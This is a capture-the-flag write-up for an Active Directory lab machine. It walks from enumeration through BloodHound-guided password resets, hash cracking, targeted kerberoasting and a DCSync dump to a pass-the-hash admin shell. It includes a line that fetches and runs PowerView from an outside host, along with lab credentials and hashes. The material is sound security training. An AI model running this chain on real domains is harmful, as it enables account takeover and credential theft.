## Administrator

### Lab Details 

- Difficulty: Medium
- Type: BloodHound, Lateral Movements, DCSync, Active Directory, Windows

#### Enumeration
- run `nmap` and we are given the credential `Olivia:ichliebedich`
```bash
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-01 23:17:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
50507/tcp open  msrpc         Microsoft Windows RPC
54155/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
54160/tcp open  msrpc         Microsoft Windows RPC
54163/tcp open  msrpc         Microsoft Windows RPC
54183/tcp open  msrpc         Microsoft Windows RPC
```
- cannot login to `FTP` anonymously or as `Olivia`
- check `SMB`as `Olivia` and no right as anonymous user
```bash
$ smbmap -u Olivia -p ichliebedich -H 10.129.128.98
[+] IP: 10.129.128.98:445	Name: 10.129.128.98                                     
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
```
- run `enum4linux-ng` as `Oliva` we get more domain info via `RPC`
```bash
$ enum4linux-ng administrator.htb -u Olivia -p ichliebedich -oY out
ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... administrator.htb
[*] Username ......... 'Olivia'
[*] Random Username .. 'dgxuoxca'
[*] Password ......... 'ichliebedich'
[*] Timeout .......... 5 second(s)

 ==========================================
|    Listener Scan on administrator.htb    |
 ==========================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =========================================================
|    Domain Information via LDAP for administrator.htb    |
 =========================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: administrator.htb

 ================================================================
|    NetBIOS Names and Workgroup/Domain for administrator.htb    |
 ================================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ==============================================
|    SMB Dialect Check on administrator.htb    |
 ==============================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: true

 ================================================================
|    Domain Information via SMB session for administrator.htb    |
 ================================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC
NetBIOS domain name: ADMINISTRATOR
DNS domain: administrator.htb
FQDN: dc.administrator.htb
Derived membership: domain member
Derived domain: ADMINISTRATOR

 ==============================================
|    RPC Session Check on administrator.htb    |
 ==============================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for user session
[+] Server allows session using username 'Olivia', password 'ichliebedich'
[*] Check for random user
[-] Could not establish random user session: STATUS_LOGON_FAILURE

 ========================================================
|    Domain Information via RPC for administrator.htb    |
 ========================================================
[+] Domain: ADMINISTRATOR
[+] Domain SID: S-1-5-21-1088858960-373806567-254189436
[+] Membership: domain member

 ====================================================
|    OS Information via RPC for administrator.htb    |
 ====================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[+] Found OS information via 'srvinfo'
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: ''
OS build: '20348'
Native OS: not supported
Native LAN manager: not supported
Platform id: '500'
Server type: '0x80102b'
Server type string: Sv PDC Tim NT

 ==========================================
|    Users via RPC on administrator.htb    |
 ==========================================
[*] Enumerating users via 'querydispinfo'
[+] Found 10 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 10 user(s) via 'enumdomusers'
[+] After merging user results we have 10 user(s) total:
'1108':
  username: olivia
  name: Olivia Johnson
  acb: '0x00000214'
  description: (null)
'1109':
  username: michael
  name: Michael Williams
  acb: '0x00000210'
  description: (null)
'1110':
  username: benjamin
  name: Benjamin Brown
  acb: '0x00000210'
  description: (null)
'1112':
  username: emily
  name: Emily Rodriguez
  acb: '0x00000210'
  description: (null)
'1113':
  username: ethan
  name: Ethan Hunt
  acb: '0x00000210'
  description: (null)
'3601':
  username: alexander
  name: Alexander Smith
  acb: '0x00000211'
  description: (null)
'3602':
  username: emma
  name: Emma Johnson
  acb: '0x00000211'
  description: (null)
'500':
  username: Administrator
  name: (null)
  acb: '0x00000210'
  description: Built-in account for administering the computer/domain
'501':
  username: Guest
  name: (null)
  acb: '0x00000215'
  description: Built-in account for guest access to the computer/domain
'502':
  username: krbtgt
  name: (null)
  acb: '0x00020011'
  description: Key Distribution Center Service Account

 ===========================================
|    Groups via RPC on administrator.htb    |
 ===========================================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': timed out
[*] Enumerating builtin groups
[+] Found 28 group(s) via 'enumalsgroups builtin'
[*] Enumerating domain groups
[+] Found 15 group(s) via 'enumdomgroups'
[+] After merging groups results we have 43 group(s) total:
'1102':
  groupname: DnsUpdateProxy
  type: domain
'498':
  groupname: Enterprise Read-only Domain Controllers
  type: domain
'512':
  groupname: Domain Admins
  type: domain
'513':
  groupname: Domain Users
  type: domain
'514':
  groupname: Domain Guests
  type: domain
'515':
  groupname: Domain Computers
  type: domain
'516':
  groupname: Domain Controllers
  type: domain
'518':
  groupname: Schema Admins
  type: domain
'519':
  groupname: Enterprise Admins
  type: domain
'520':
  groupname: Group Policy Creator Owners
  type: domain
'521':
  groupname: Read-only Domain Controllers
  type: domain
'522':
  groupname: Cloneable Domain Controllers
  type: domain
'525':
  groupname: Protected Users
  type: domain
'526':
  groupname: Key Admins
  type: domain
'527':
  groupname: Enterprise Key Admins
  type: domain
'544':
  groupname: Administrators
  type: builtin
'545':
  groupname: Users
  type: builtin
'546':
  groupname: Guests
  type: builtin
'548':
  groupname: Account Operators
  type: builtin
'549':
  groupname: Server Operators
  type: builtin
'550':
  groupname: Print Operators
  type: builtin
'551':
  groupname: Backup Operators
  type: builtin
'552':
  groupname: Replicator
  type: builtin
'554':
  groupname: Pre-Windows 2000 Compatible Access
  type: builtin
'555':
  groupname: Remote Desktop Users
  type: builtin
'556':
  groupname: Network Configuration Operators
  type: builtin
'557':
  groupname: Incoming Forest Trust Builders
  type: builtin
'558':
  groupname: Performance Monitor Users
  type: builtin
'559':
  groupname: Performance Log Users
  type: builtin
'560':
  groupname: Windows Authorization Access Group
  type: builtin
'561':
  groupname: Terminal Server License Servers
  type: builtin
'562':
  groupname: Distributed COM Users
  type: builtin
'568':
  groupname: IIS_IUSRS
  type: builtin
'569':
  groupname: Cryptographic Operators
  type: builtin
'573':
  groupname: Event Log Readers
  type: builtin
'574':
  groupname: Certificate Service DCOM Access
  type: builtin
'575':
  groupname: RDS Remote Access Servers
  type: builtin
'576':
  groupname: RDS Endpoint Servers
  type: builtin
'577':
  groupname: RDS Management Servers
  type: builtin
'578':
  groupname: Hyper-V Administrators
  type: builtin
'579':
  groupname: Access Control Assistance Operators
  type: builtin
'580':
  groupname: Remote Management Users
  type: builtin
'582':
  groupname: Storage Replica Administrators
  type: builtin

 ===========================================
|    Shares via RPC on administrator.htb    |
 ===========================================
[*] Enumerating shares
[+] Found 5 share(s):
ADMIN$:
  comment: Remote Admin
  type: Disk
C$:
  comment: Default share
  type: Disk
IPC$:
  comment: Remote IPC
  type: IPC
NETLOGON:
  comment: Logon server share
  type: Disk
SYSVOL:
  comment: Logon server share
  type: Disk
[*] Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share IPC$
[+] Mapping: OK, Listing: NOT SUPPORTED
[*] Testing share NETLOGON
[+] Mapping: OK, Listing: OK
[*] Testing share SYSVOL
[+] Mapping: OK, Listing: OK

 ==============================================
|    Policies via RPC for administrator.htb    |
 ==============================================
[*] Trying port 445/tcp
[+] Found policy:
Domain password information:
  Password history length: 24
  Minimum password length: 7
  Maximum password age: 41 days 23 hours 53 minutes
  Password properties:
  - DOMAIN_PASSWORD_COMPLEX: false
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
Domain lockout information:
  Lockout observation window: 30 minutes
  Lockout duration: 30 minutes
  Lockout threshold: None
Domain logoff information:
  Force logoff time: not set

 ==============================================
|    Printers via RPC for administrator.htb    |
 ==============================================
[+] No printers available
[!] Could not write YAML output to out.yaml
```
- check `winrm` access via `evil-winrm` as `Olivia`
```bash
$ evil-winrm -i 10.129.128.98 -u olivia -p 'ichliebedich'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\olivia\Documents>
```
#### Initial Foothold 

#### Lateral Movement (If any)
- run `bloodhound-python` and load data to dashboard
- search for user `Olivia` and click on `Transitive Object Control` we see that `Olivia` has `GenericWrite` over user `Michael` and `Micheal` has `ForceChangePassword` right over user `Benjamin` and user `Benjamin`is `MemberOf` `ShareModerator` group
![[Oliva bloodhound.png]]
- to exploit this first we change the password of `Michael` 
```powershell
*Evil-WinRM* PS C:\Users\olivia> net user michael pass123 /domain
The command completed successfully.
```
- then login as `Michael` & change the password of `Benjamin`
```bash
$ evil-winrm -i 10.129.128.98 -u michael -p pass123
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\michael\Documents> whoami
administrator\michael
```
- then we can change the password of user `Benjamin`
```powershell
## downloads the powerview
*Evil-WinRM* PS C:\Users\michael\Documents> IEX (New-ObjectNet.WebClient).DownloadString ('http://10.10.15.51:8000/PowerView.ps1')
*Evil-WinRM* PS C:\Users\michael\Documents> $SecPassword = ConvertTo-SecureString 'pass123' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\michael\Documents> $Cred = New-Object System.Management.Automation.PSCredential ('ADMINISTRATOR\michael', $SecPassword)
*Evil-WinRM* PS C:\Users\michael\Documents> $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
## uses michaels cred to authenticate password change operation
*Evil-WinRM* PS C:\Users\michael\Documents> Set-DomainUserPassword -Identity benjamin -AccountPassword $UserPassword -Credential $Cred
```
- login to `ftp` as `benjamin`
```bash
$ ftp benjamin@10.129.128.98
Connected to 10.129.128.98.
220 Microsoft FTP Service
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||62276|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> mget Backup.psafe3
mget Backup.psafe3 [anpqy?]? yes
229 Entering Extended Passive Mode (|||62279|)
125 Data connection already open; Transfer starting.
100% |***************************************************************************************************************************|   952        5.14 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (5.13 KiB/s)
```
- download `passwordsafe` to view the `psafe3` file
```bash
$ sudo apt install passwordsafe
```
- loading the file requires a password which makes thing of using some sort of hash to john to crack the password 
- found `pwsafe2john`
```bash
$ pwsafe2john Backup.psafe3 > Backup.psafe3.hash
```
- use hashcat to crack the hash
```
$ hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD EPYC 7543 32-Core Processor, skipped

OpenCL API (OpenCL 2.1 LINUX) - Platform #2 [Intel(R) Corporation]
==================================================================
* Device #2: AMD EPYC 7543 32-Core Processor, 3923/7910 MB (988 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

ATTENTION! Potfile storage is disabled for this hash mode.
Passwords cracked during this session will NOT be stored to the potfile.
Consider using -o to save cracked passwords.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

Backup.psafe3:tekieromucho                                
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5200 (Password Safe v3)
Hash.Target......: Backup.psafe3
Time.Started.....: Wed Oct  1 12:18:01 2025 (0 secs)
Time.Estimated...: Wed Oct  1 12:18:01 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:    45735 H/s (8.80ms) @ Accel:512 Loops:512 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 6144/14344385 (0.04%)
Rejected.........: 0/6144 (0.00%)
Restore.Point....: 4096/14344385 (0.03%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:2048-2049
Candidate.Engine.: Device Generator
Candidates.#2....: newzealand -> iheartyou

Started: Wed Oct  1 12:17:52 2025
Stopped: Wed Oct  1 12:18:02 2025
```
- get plaintext `tekieromucho`
- open up the `psafe3` file and enter the password
- right on an entry and click on edit and show, we are able to view the plaintext and copy it 
![[psafe3.png]]
- save below to `users.txt `and `passwords.txt`
	- `emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb`
	- `alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw`
	- `emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur`
- run `nxc` to enumerate for valid credential
```bash
$ nxc smb 10.129.128.98 -u ./users.txt -p ./password.txt
SMB         10.129.128.98   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.128.98   445    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb 
```
- we have `emily`'s credential
#### Privilege Escalation
- check `emily`'s relationship on `bloodhound` and we find that `emily` has `GenericWrite` privilege over `ethan` and `ethan` has `DCsync` over the domain
![[emily bloodhound.png]]
- `DCsync` privilege
![[ethan bloodhound.png]]
- to exploit this we can update the password for user `ethan` then perform `DCsync Attack` as `ethan`
- we cannot directly overwrite `ethan`'s password so we have to try something else
```bash
*Evil-WinRM* PS C:\Users\emily> net user ethan pass123 /domain
net.exe : System error 5 has occurred.
    + CategoryInfo          : NotSpecified: (System error 5 has occurred.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
Access is denied.
```
- we can attempt targeted `kerberoast` attack
```bash
python3 targetedKerberoast.py --dc-ip 10.10.11.42 -d administrator.htb -u emily -
p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -U ethan.txt ## require the username be in a txt file
[*] Starting kerberoast attacks
[*] Fetching usernames from file
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$251f393b2d875bfb036304f8d57ef0aa$bc64981f90607b226adde7cfbbc3bdcc8c08780ed580dc3f525f87da2e0412f6ffeed14baa7dea5a0b483a69075d5663c613f4ab9b0a3f4931f988b9a<snip>
```
- crack it with `hashcat`
```bash
$ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt 
```
- password `limpbizkit`
- perform `DCSync` attack dump all hashes
```bash
$ secretsdump.py -just-dc ADMINISTRATOR.HTB/ethan@10.129.128.98
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
<SNIP>
```
- get reverse shell via `evil-winrm` with the admin hash
```bash
$ evil-winrm -i 10.129.128.98 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```
#### Resources

#### Lesson Learned
